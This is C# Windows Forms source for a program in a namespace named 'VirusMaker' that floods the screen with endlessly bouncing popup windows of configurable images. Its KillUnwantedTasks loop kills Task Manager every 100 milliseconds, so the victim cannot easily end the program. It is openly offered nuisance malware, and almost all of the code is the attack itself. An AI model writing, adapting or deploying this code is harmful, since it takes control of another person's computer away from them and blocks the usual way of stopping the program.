using System.Diagnostics;

namespace VirusMaker
{
    public partial class Form1 : Form
    {
        // Settings
        private string SettingsPath = "Settings.txt";
        private string ImagesSettingsPath = "Images.txt";
        private Dictionary<string, string> Settings = new();
        private int MaxPopups;
        private double PopupAddChance;
        private double PopupRemoveChance;
        private int PopupLifetime;
        private List<Image> Images = new();
        // Runtime Variables
        private List<Popup> Popups = new();

        public Form1()
        {
            InitializeComponent();

            string[] SettingStrings = File.ReadAllText(SettingsPath).Split(',');

            foreach (string SettingString in SettingStrings)
            {
                string[] KeyAndValue = SettingString.Split(':');
                Settings[KeyAndValue[0].ToLower()] = KeyAndValue[1];
            }

            string[] ImageNames = File.ReadAllText(ImagesSettingsPath).Split(',');

            foreach (string ImageName in ImageNames)
            {
                Images.Add(BytesToImage(File.ReadAllBytes(ImageName)));
            }

            // Settings
            MaxPopups = int.Parse(Settings["maxpopups"]);
            PopupAddChance = double.Parse(Settings["popupaddchance"]);
            PopupRemoveChance = double.Parse(Settings["popupremovechance"]);
            PopupLifetime = int.Parse(Settings["popuplifetime"]);

            KillUnwantedTasks();
            BetterUpdate();
        }

        public static Image BytesToImage(byte[] Bytes)
        {
            using (MemoryStream MemoryStream = new(Bytes))
            {
                return Image.FromStream(MemoryStream);
            }
        }

        private async void BetterUpdate()
        {
            while (true)
            {
                if (Popups.Count > 0 && Random.Shared.NextDouble() * 100 < PopupRemoveChance)
                {
                    int Index = Random.Shared.Next(0, Popups.Count - 1);
                    if (Popups[Index].Lifetime >= PopupLifetime)
                    {
                        Popups[Index].Form.Dispose();
                        Popups.RemoveAt(Index);
                    }
                }
                if (Popups.Count < MaxPopups && Random.Shared.NextDouble() * 100 < PopupAddChance)
                {
                    Popups.Add(new Popup(Images[Random.Shared.Next(0, Images.Count)]));
                }

                foreach (Popup Popup in Popups)
                {
                    Popup.Lifetime++;
                    Popup.Form.Location = new Point(Popup.Form.Location.X + Popup.Velocity.X, Popup.Form.Location.Y + Popup.Velocity.Y);

                    // Example: 1 != 1: false
                    // Example: -1 != 1: true
                    // Is Location.X behind 0 and Velocity.X != Positive Velocity.X
                    if (Popup.Form.Location.X < 0 && Popup.Velocity.X != Math.Abs(Popup.Velocity.X))
                    {
                        Popup.Velocity = new Vector2Int(-Popup.Velocity.X, Popup.Velocity.Y);
                    }
                    // Is Location.X behind 0 and Velocity.X == Positive Velocity.X
                    else if (Popup.Form.Location.X + Popup.Form.Size.Width > Screen.PrimaryScreen.Bounds.Width && Popup.Velocity.X == Math.Abs(Popup.Velocity.X))
                    {
                        Popup.Velocity = new Vector2Int(-Popup.Velocity.X, Popup.Velocity.Y);
                    }

                    // Is Location.Y behind 0 and Velocity.Y != Positive Velocity.Y
                    if (Popup.Form.Location.Y < 0 && Popup.Velocity.Y != Math.Abs(Popup.Velocity.Y))
                    {
                        Popup.Velocity = new Vector2Int(Popup.Velocity.X, -Popup.Velocity.Y);
                    }
                    // Is Location.Y behind 0 and Velocity.Y == Positive Velocity.Y
                    else if (Popup.Form.Location.Y + Popup.Form.Size.Height > Screen.PrimaryScreen.Bounds.Height && Popup.Velocity.Y == Math.Abs(Popup.Velocity.Y))
                    {
                        Popup.Velocity = new Vector2Int(Popup.Velocity.X, -Popup.Velocity.Y);
                    }
                }
                await Task.Delay(50);
            }
        }

        private async void KillUnwantedTasks()
        {
            while (true)
            {
                Process[] Processes = Process.GetProcesses();
                foreach (Process Process in Processes)
                {
                    switch (Process.ProcessName)
                    {
                        case "taskmgr":
                            Process.Kill(true);
                            break;
                    }
                }
                await Task.Delay(100);
            }
        }
    }
}
